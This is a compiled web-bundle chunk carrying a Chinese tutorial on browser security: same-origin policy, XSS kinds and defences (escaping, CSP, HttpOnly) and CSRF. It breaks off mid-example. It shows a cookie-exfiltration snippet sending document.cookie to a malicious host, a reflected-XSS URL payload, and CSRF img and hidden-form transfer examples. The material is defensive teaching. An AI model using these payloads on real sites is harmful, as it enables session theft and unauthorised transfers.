{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[36],{546:function(t,a,s){t.exports=s.p+\"assets/img/image-20200916214658877.4a724ca4.png\"},547:function(t,a,s){t.exports=s.p+\"assets/img/image-20200916214730420.0cad2555.png\"},548:function(t,a,s){t.exports=s.p+\"assets/img/image-20200916214918877.6ba9d1d0.png\"},549:function(t,a,s){t.exports=s.p+\"assets/img/image-20200916214953245.12659b11.png\"},550:function(t,a,s){t.exports=s.p+\"assets/img/image-20200916223219577.beb3a484.png\"},893:function(t,a,s){\"use strict\";s.r(a);var e=s(43),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,e=t._self._c||a;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"浏览器安全\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#浏览器安全\"}},[t._v(\"#\")]),t._v(\" 浏览器安全\")]),t._v(\" \"),e(\"p\",[t._v(\"浏览器安全可以分为三大块——\"),e(\"strong\",[t._v(\"Web 页面安全、浏览器网络安全\")]),t._v(\"和\"),e(\"strong\",[t._v(\"浏览器系统安全\")])]),t._v(\" \"),e(\"h2\",{attrs:{id:\"同源策略与跨域\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#同源策略与跨域\"}},[t._v(\"#\")]),t._v(\" 同源策略与跨域\")]),t._v(\" \"),e(\"blockquote\",[e(\"ol\",[e(\"li\",[t._v(\"页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。\")]),t._v(\" \"),e(\"li\",[t._v(\"使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。\")]),t._v(\" \"),e(\"li\",[t._v(\"两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。\")])])]),t._v(\" \"),e(\"h3\",{attrs:{id:\"什么是同源策略\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#什么是同源策略\"}},[t._v(\"#\")]),t._v(\" 什么是同源策略\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源\")]),t._v(\"。\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"https://cchenzw.top/?category=1\\nhttps://cchenzw.top/?category=0\\n\\n\")])])]),e(\"p\",[t._v(\"它们具有相同的协议 HTTP、相同的域名 cchenzw.top，以及相同的端口 443，\")]),t._v(\" \"),e(\"p\",[t._v(\"两个相同的源之间是可以相互访问资源和操作 DOM 的。\")]),t._v(\" \"),e(\"p\",[t._v(\"两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。\")]),t._v(\" \"),e(\"p\",[t._v(\"同源策略主要表现在 DOM、Web 数据和网络这三个层面。\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"第一个，DOM 层面\")]),t._v(\"。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"第二个，数据层面\")]),t._v(\"。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"第三个，网络层面\")]),t._v(\"。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。\")]),t._v(\" \"),e(\"h3\",{attrs:{id:\"安全和便利性的权衡\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#安全和便利性的权衡\"}},[t._v(\"#\")]),t._v(\" 安全和便利性的权衡\")]),t._v(\" \"),e(\"p\",[t._v(\"不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。\")]),t._v(\" \"),e(\"p\",[t._v(\"出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，\")]),t._v(\" \"),e(\"p\",[t._v(\"浏览器出让了同源策略的这一些安全性\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"_1-页面中可以嵌入第三方资源\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_1-页面中可以嵌入第三方资源\"}},[t._v(\"#\")]),t._v(\" \"),e(\"strong\",[t._v(\"1. 页面中可以嵌入第三方资源\")])]),t._v(\" \"),e(\"p\",[t._v(\"恶意程序在 HTML 文件内容中插入一段 JavaScript 代码。当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。\")]),t._v(\" \"),e(\"p\",[t._v(\"除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-js extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-js\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"function\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"onClick\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),t._v(\"\\n  \"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"let\")]),t._v(\" url \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token template-string\"}},[e(\"span\",{pre:!0,attrs:{class:\"token template-punctuation string\"}},[t._v(\"`\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"http://cilicili.com?cookie = \")]),e(\"span\",{pre:!0,attrs:{class:\"token interpolation\"}},[e(\"span\",{pre:!0,attrs:{class:\"token interpolation-punctuation punctuation\"}},[t._v(\"${\")]),t._v(\"document\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\".\")]),t._v(\"cookie\"),e(\"span\",{pre:!0,attrs:{class:\"token interpolation-punctuation punctuation\"}},[t._v(\"}\")])]),e(\"span\",{pre:!0,attrs:{class:\"token template-punctuation string\"}},[t._v(\"`\")])]),t._v(\"\\n  \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"open\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),t._v(\"url\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"onClick\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),t._v(\"\\n\")])])]),e(\"p\",[t._v(\"这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。\")]),t._v(\" \"),e(\"p\",[t._v(\"以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。\"),e(\"strong\",[t._v(\"CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码\")]),t._v(\"。通过这些手段就可以大大减少 XSS 攻击。\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"_2-跨域资源共享和跨文档消息机制\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_2-跨域资源共享和跨文档消息机制\"}},[t._v(\"#\")]),t._v(\" 2.跨域资源共享和跨文档消息机制\")]),t._v(\" \"),e(\"p\",[e(\"strong\",[t._v(\"跨域资源共享（CORS）\")]),t._v(\"，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。\")]),t._v(\" \"),e(\"p\",[t._v(\"在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了\"),e(\"strong\",[t._v(\"跨文档消息机制\")]),t._v(\"，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"跨站脚本攻击xss-为什么cookie中有httponly属性？\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#跨站脚本攻击xss-为什么cookie中有httponly属性？\"}},[t._v(\"#\")]),t._v(\" 跨站脚本攻击XSS:为什么Cookie中有HttpOnly属性？\")]),t._v(\" \"),e(\"blockquote\",[e(\"p\",[t._v(\"XSS 攻击就是黑客往页面中注入恶意脚本，然后将页面的一些重要数据上传到恶意服务器。常见的三种 XSS 攻击模式是存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击。\")]),t._v(\" \"),e(\"p\",[t._v(\"这三种攻击方式的共同点是都需要往用户的页面中注入恶意脚本，然后再通过恶意脚本将用户数据上传到黑客的恶意服务器上。而三者的不同点在于注入的方式不一样，有通过服务器漏洞来进行注入的，还有在客户端直接注入的。\")]),t._v(\" \"),e(\"p\",[t._v(\"针对这些 XSS 攻击，主要有三种防范策略，第一种是通过服务器对输入的内容进行过滤或者转码，第二种是充分利用好 CSP，第三种是使用 HttpOnly 来保护重要的 Cookie 信息。\")]),t._v(\" \"),e(\"p\",[t._v(\"当然除了以上策略之外，我们还可以通过添加验证码防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以限制其输入长度，这样可以增大 XSS 攻击的难度。\")])]),t._v(\" \"),e(\"h3\",{attrs:{id:\"什么是xss攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#什么是xss攻击\"}},[t._v(\"#\")]),t._v(\" 什么是XSS攻击\")]),t._v(\" \"),e(\"p\",[t._v(\"XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。\")]),t._v(\" \"),e(\"p\",[t._v(\"最开始的时候，这种攻击是通过跨域来实现的，所以叫“跨域脚本”。但是发展到现在，往 HTML 文件中注入恶意代码的方式越来越多了，所以是否跨域注入脚本已经不是唯一的注入手段了，但是 XSS 这个名字却一直保留至今。\")]),t._v(\" \"),e(\"p\",[t._v(\"当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。下面我们就来看看，如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。\")]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"可以\"),e(\"strong\",[t._v(\"窃取 Cookie 信息\")]),t._v(\"。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。\")]),t._v(\" \"),e(\"li\",[t._v(\"可以\"),e(\"strong\",[t._v(\"监听用户行为\")]),t._v(\"。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。\")]),t._v(\" \"),e(\"li\",[t._v(\"可以通过\"),e(\"strong\",[t._v(\"修改 DOM\")]),t._v(\"伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。\")]),t._v(\" \"),e(\"li\",[t._v(\"还可以\"),e(\"strong\",[t._v(\"在页面内生成浮窗广告\")]),t._v(\"，这些广告会严重地影响用户体验。\")])]),t._v(\" \"),e(\"h3\",{attrs:{id:\"_1-存储型-xss-攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_1-存储型-xss-攻击\"}},[t._v(\"#\")]),t._v(\" 1. 存储型 XSS 攻击\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(546),alt:\"image-20200916214658877\"}})]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；\")]),t._v(\" \"),e(\"li\",[t._v(\"然后用户向网站请求包含了恶意 JavaScript 脚本的页面；\")]),t._v(\" \"),e(\"li\",[t._v(\"当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。\")])]),t._v(\" \"),e(\"p\",[t._v(\"2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(547),alt:\"image-20200916214730420\"}})]),t._v(\" \"),e(\"p\",[t._v(\"当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息。\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(548),alt:\"image-20200916214918877\"}})]),t._v(\" \"),e(\"p\",[t._v(\"当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。\")]),t._v(\" \"),e(\"p\",[t._v(\"恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(549),alt:\"image-20200916214953245\"}})]),t._v(\" \"),e(\"p\",[t._v(\"黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号，并利用用户账号进行一些恶意操作。\")]),t._v(\" \"),e(\"p\",[t._v(\"以上就是存储型 XSS 攻击的一个典型案例，这是乌云网在 2015 年曝出来的\")]),t._v(\" \"),e(\"h3\",{attrs:{id:\"_2-反射型-xss-攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_2-反射型-xss-攻击\"}},[t._v(\"#\")]),t._v(\" 2. 反射型 XSS 攻击\")]),t._v(\" \"),e(\"p\",[t._v(\"恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。\")]),t._v(\" \"),e(\"p\",[t._v(\"用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。\")]),t._v(\" \"),e(\"p\",[t._v(\"黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接。\")]),t._v(\" \"),e(\"p\",[t._v(\"另外需要注意的是，\"),e(\"strong\",[t._v(\"Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方\")]),t._v(\"。\")]),t._v(\" \"),e(\"p\",[t._v(\"比如我们有如下网站\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"http://www.xx.com/?name=zs\\n\")])])]),e(\"p\",[t._v(\"这个网站会在页面显示zs这两个字，但是如果我们把zs改为\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"http://www.xx.com/?name=<script>alert('你被xss攻击了')<\\/script>\\n\")])])]),e(\"p\",[t._v(\"这样当页面解析到\"),e(\"code\",[t._v(\"<script>alert('你被xss攻击了')<\\/script>\")]),t._v(\"这个name的value时，会自动认为他是一段js脚本并执行。\")]),t._v(\" \"),e(\"h3\",{attrs:{id:\"_3-基于-dom-的-xss-攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_3-基于-dom-的-xss-攻击\"}},[t._v(\"#\")]),t._v(\" 3. 基于 DOM 的 XSS 攻击\")]),t._v(\" \"),e(\"p\",[t._v(\"基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。\")]),t._v(\" \"),e(\"h3\",{attrs:{id:\"防治\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#防治\"}},[t._v(\"#\")]),t._v(\" 防治\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"服务器对输入脚本进行过滤或转码\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#服务器对输入脚本进行过滤或转码\"}},[t._v(\"#\")]),t._v(\" 服务器对输入脚本进行过滤或转码\")]),t._v(\" \"),e(\"p\",[t._v(\"不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如最典型的：\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"code:<script>alert('你被 xss 攻击了')<\\/script>\\n\")])])]),e(\"p\",[t._v(\"这段代码过滤后，只留下了：\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"code:\\n\")])])]),e(\"p\",[t._v(\"这样，当用户再次请求该页面时，由于\"),e(\"code\",[t._v(\"<script>\")]),t._v(\"标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。\")]),t._v(\" \"),e(\"p\",[t._v(\"除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"code:&lt;script&gt;alert(&#39; 你被 xss 攻击了 &#39;)&lt;/script&gt;\\n\")])])]),e(\"p\",[t._v(\"经过转码之后的内容，如\"),e(\"code\",[t._v(\"<script>\")]),t._v(\"标签被转换为\"),e(\"code\",[t._v(\"<script>\")]),t._v(\"，因此即使这段脚本返回给页面，页面也不会执行这段脚本。\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"充分利用-csp\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#充分利用-csp\"}},[t._v(\"#\")]),t._v(\" 充分利用 CSP\")]),t._v(\" \"),e(\"p\",[t._v(\"实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：\")]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；\")]),t._v(\" \"),e(\"li\",[t._v(\"禁止向第三方域提交数据，这样用户数据也不会外泄；\")]),t._v(\" \"),e(\"li\",[t._v(\"禁止执行内联脚本和未授权的脚本；\")]),t._v(\" \"),e(\"li\",[t._v(\"还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。\")])]),t._v(\" \"),e(\"p\",[t._v(\"因此，利用好 CSP 能够有效降低 XSS 攻击的概率。\")]),t._v(\" \"),e(\"h4\",{attrs:{id:\"使用-httponly-属性\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#使用-httponly-属性\"}},[t._v(\"#\")]),t._v(\" 使用 HttpOnly 属性\")]),t._v(\" \"),e(\"p\",[t._v(\"通过使用 HttpOnly 属性来保护我们 Cookie 的安全。\")]),t._v(\" \"),e(\"p\",[t._v(\"通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：\")]),t._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[t._v(\"set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly\\n\\n\")])])]),e(\"p\",[t._v(\"我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly\")]),t._v(\" \"),e(\"p\",[t._v(\"NID 这个 Cookie 的 HttpOlny 属性是被勾选上的，所以 NID 的内容是无法通过 document.cookie 是来读取的。\")]),t._v(\" \"),e(\"p\",[t._v(\"由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"csrf攻击：陌生链接不要随便点\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#csrf攻击：陌生链接不要随便点\"}},[t._v(\"#\")]),t._v(\" CSRF攻击：陌生链接不要随便点\")]),t._v(\" \"),e(\"p\",[t._v(\"在 2007 年的某一天，David 无意间打开了 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David就发现他的域名被盗了。不过几经周折，David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接\")]),t._v(\" \"),e(\"p\",[t._v(\"域名被盗流程\")]),t._v(\" \"),e(\"ul\",[e(\"li\",[t._v(\"David发起登录邮箱请求\")]),t._v(\" \"),e(\"li\",[t._v(\"Gmail返回登录状态给David浏览器，包括Cookie,Session\")]),t._v(\" \"),e(\"li\",[t._v(\"黑客引诱David打开恶意站点链接，并在该页面编写邮件过滤器，通过Gmail提供的HTTP设置接口把邮件转发到黑客的邮箱，这样由于有了David的邮件内容，黑客就可以直接从服务商那里重置David的账号了。\")])]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:s(550),alt:\"image-20200916223219577\"}})]),t._v(\" \"),e(\"h3\",{attrs:{id:\"什么是csrf攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#什么是csrf攻击\"}},[t._v(\"#\")]),t._v(\" 什么是CSRF攻击\")]),t._v(\" \"),e(\"p\",[t._v(\"CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，\"),e(\"strong\",[t._v(\"CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事\")])]),t._v(\" \"),e(\"p\",[t._v(\"通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。\")]),t._v(\" \"),e(\"p\",[t._v(\"比如我们有个转账功能。\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-js extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-js\"}},[e(\"code\",[t._v(\"# 支持post和\"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"get\")]),t._v(\"\\n# 接口\\nhttps\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\":\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"cchenzw\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\".\")]),t._v(\"top\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"sendcoin\\n# 参数\\n## 目标用户\\nuser\\n## 目标金额\\nnumber\\n\")])])]),e(\"ol\",[e(\"li\",[e(\"strong\",[t._v(\"自动发起get请求\")])])]),t._v(\" \"),e(\"div\",{staticClass:\"language-js extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-js\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"h1\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\" 点击和渣渣辉一起砍我 \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"h1\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"<\")]),t._v(\"img src\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"https://cchenzw.top/sendcoin?user=hacker&number=100\"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\">\")]),t._v(\"\\n\")])])]),e(\"p\",[t._v(\"在这段代码中，黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的钱就被转移到黑客的账户上去了。\")]),t._v(\" \"),e(\"ol\",{attrs:{start:\"2\"}},[e(\"li\",[e(\"strong\",[t._v(\"自动发起post请求\")])])]),t._v(\" \"),e(\"p\",[t._v(\"除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-html extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-html\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"form\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"id\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"'\")]),t._v(\"hacker-form\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"'\")])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"action\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"https://cchenzw.top/sendcoin\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"method\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),t._v(\"POST\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\">\")])]),t._v(\"\\n    \"),e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"<\")]),t._v(\"input\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"type\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')]),t._v(\"hidden\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v('\"')])]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[t._v(\"name\")]),e(\"span\",{pre:!0,attrs:{class:\"token attr-value\"}},[e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token 